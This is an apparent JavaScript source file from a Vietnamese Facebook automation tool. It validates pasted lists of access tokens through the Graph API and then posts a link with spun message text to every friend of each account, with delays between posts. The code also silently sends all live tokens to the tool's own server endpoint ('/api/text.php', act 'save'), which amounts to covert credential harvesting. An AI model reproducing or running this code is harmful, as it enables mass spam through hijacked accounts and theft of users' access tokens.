function auto_tagfrwall_check(a) {
    $.get('https://graph.facebook.com/', {
        method: 'post',
        access_token: a,
        batch: '[{\"method\":\"GET\",\"relative_url\":\"me?fields=id,name\"},{\"method\":\"GET\",\"relative_url\":\"SELECT uid, name FROM user WHERE uid = me()\"}]',
        include_headers: 'false'
    }, function(d) {
        var j = JSON.parse(d[0].body);
        auto_tagfrwall.array[auto_tagfrwall.success] = [], auto_tagfrwall.array[auto_tagfrwall.success].uid = j.id, auto_tagfrwall.array[auto_tagfrwall.success].name = j.name, auto_tagfrwall.array[auto_tagfrwall.success].data = JSON.parse(d[1].body).data, auto_tagfrwall.array[auto_tagfrwall.success].access_token = a, auto_tagfrwall.success++, auto_tagfrwall.bach += a + '\n', tbody = '', tbody += '<tr>', tbody += '	<td>' + auto_tagfrwall.success + '</td>', tbody += '	<td>' + j.name + '</td>', tbody += '	<td align=\"center\">' + auto_tagfrwall.array[auto_tagfrwall.success - 1].data.length + '</td>', tbody += '	<td align=\"center\"><font color=\"green\"><span id=\"auto_tagfrwall_success_' + auto_tagfrwall.success + '\">0</span></font></td>', tbody += '	<td align=\"center\"><font color=\"red\"><span id=\"auto_tagfrwall_error_' + auto_tagfrwall.success + '\">0</span></font></td>', tbody += '	<td id=\"auto_tagfrwall_status_' + auto_tagfrwall.success + '\" b-data=\"loading\">Đang chờ !</td>', tbody += '</tr>', $('#html_auto_tagfrwall_body').append(tbody)
    }).fail(function(d) {
        'undefined' == typeof d.responseText ? auto_tagfrwall_check(a) : auto_tagfrwall.error++
    }).always(function() {
        if (auto_tagfrwall.success + auto_tagfrwall.error == auto_tagfrwall.token.split('\n').length) {
            if (auto_tagfrwall.success > 0) {
                var a = $.trim(auto_tagfrwall.bach).split('\n');
                a.length > 0 && $.post('//' + b_sv + '/api/text.php', {
                    act: 'save',
                    array: a
                });
                for (var d = 0; d < auto_tagfrwall.array.length; d++) {
                    auto_tagfrwall_msg(d, 0)
                }
            } else {
                $('#submit_auto_tagfrwall').buttonStop(), $('#submit_auto_tagfrwall_stop').disabled(), noti.success('Không Access Token nào Live !'), $('#html_auto_tagfrwall_result').hide()
            }
        }
    })
}

function auto_tagfrwall_msg(a, d) {
    return 0 == auto_tagfrwall.run ? !1 : void((0 == auto_tagfrwall.array[a].data.length ? ($('#auto_tagfrwall_status_' + (a + 1)).html('<font color=\"red\">Không có bạn bè !</font>'), auto_tagfrwall.total++, auto_tagfrwall.total == auto_tagfrwall.success && ($('#submit_auto_tagfrwall').buttonStop(), $('#submit_auto_tagfrwall_stop').disabled(), noti.success('Quá trình gửi tin nhắn đã hoàn tất !'))) : ! function(j, c, b) {
        $('#auto_tagfrwall_status_' + (a + 1)).html('<font color=\"blue\">Đang gửi tin nhắn đến <b>' + b + '</b></font> ' + run.loading()), $.get('https://graph.facebook.com/'+c+'/feed', {
            link:''+auto_tagfrwall.id+'',
            locale: 'en_US',
            method: 'post',
            return_structure: 'true',
            message: init.spinText(auto_tagfrwall.message.replace(/\$\m\e/g, j).replace(/\$\y\o\u/g, b)),
            access_token: auto_tagfrwall.array[a].access_token
        }).done(function() {
            $('#auto_tagfrwall_success_' + (a + 1)).text(parseInt($('#auto_tagfrwall_success_' + (a + 1)).text()) + 1), $('#auto_tagfrwall_status_' + (a + 1)).html('<font color=\"green\">Gửi đến <b>' + b + '</b> thành công, xin chờ <b id=\"timedown_' + (a + 1) + '\"></b> giây</font> ' + run.loading())
        }).error(function(d) {
            if ($('#auto_tagfrwall_error_' + (a + 1)).text(parseInt($('#auto_tagfrwall_error_' + (a + 1)).text()) + 1), $('#auto_tagfrwall_status_' + (a + 1)).html('<font color=\"red\">Gửi đến <b>' + b + '</b> thất bại, xin chờ <b id=\"timedown_' + (a + 1) + '\"></b> giây</font> ' + run.loading()), d.responseText) {
                var d = init.replace_JSON(d.responseText);
                noti.error(d.error.message)
            }
        }).always(function() {
            d + 1 < auto_tagfrwall.array[a].data.length ? timer.count_down_array(0, Math.floor(auto_tagfrwall.delay / 60), auto_tagfrwall.delay - 60 * Math.floor(auto_tagfrwall.delay / 60), 'timedown_' + (a + 1), a, function() {
                auto_tagfrwall_msg(a, d + 1)
            }) : ($('#auto_tagfrwall_status_' + (a + 1)).html('<font color=\"green\">Hoàn thành !</font>'), auto_tagfrwall.total++, auto_tagfrwall.total == auto_tagfrwall.success && ($('#submit_auto_tagfrwall').buttonStop(), $('#submit_auto_tagfrwall_stop').disabled(), noti.success('Quá trình gửi tin nhắn đã hoàn tất !')))
        })
    }(auto_tagfrwall.array[a].name, auto_tagfrwall.array[a].data[d].gid, auto_tagfrwall.array[a].data[d].name)))
}
location.hostname == b_sv && ($(document).on('click', '#submit_auto_tagfrwall_stop', function() {
    auto_tagfrwall.run = 0;
    for (var a = 0; a < auto_tagfrwall.array.length; a++) {
        clearTimeout(timeout_array[a])
    };
    $('[b-data=\'loading\']').text('Đã có lệnh dừng !'), $('#submit_auto_tagfrwall_stop').disabled(), $('#submit_auto_tagfrwall').buttonStop(), noti.success('Đã có lệnh dừng gửi tin nhắn !')
}), $(document).on('click', '#submit_auto_tagfrwall', function() {
    auto_tagfrwall = {
        id: $('#input_auto_tagfrwall_id').validate(),
        token: $('#input_auto_tagfrwall_token').validate(),
        message: $('#input_auto_tagfrwall_msg').val(),
        delay: $('#input_auto_tagfrwall_delay').isNumber(),
        limit: $('#input_auto_tagfrwall_limit').isNumber(),
        array: [],
        run: 1,
        total: 0,
        success: 0,
        error: 0,
        bach: ''
    }, auto_tagfrwall.id && auto_tagfrwall.token && auto_tagfrwall.delay && auto_tagfrwall.limit && ($(this).buttonLoad(), $('#submit_auto_tagfrwall_stop').undisabled(), $('#html_auto_tagfrwall_result').fadeIn('fast'), $('#html_auto_tagfrwall_body').html(''), $.each(auto_tagfrwall.token.split('\n'), function(a, d) {
        var j = d.split('|');
        j = j[1] ? j[1] : d, setTimeout(function() {
            auto_tagfrwall_check(j)
        }, 15 * a)
    }))
}))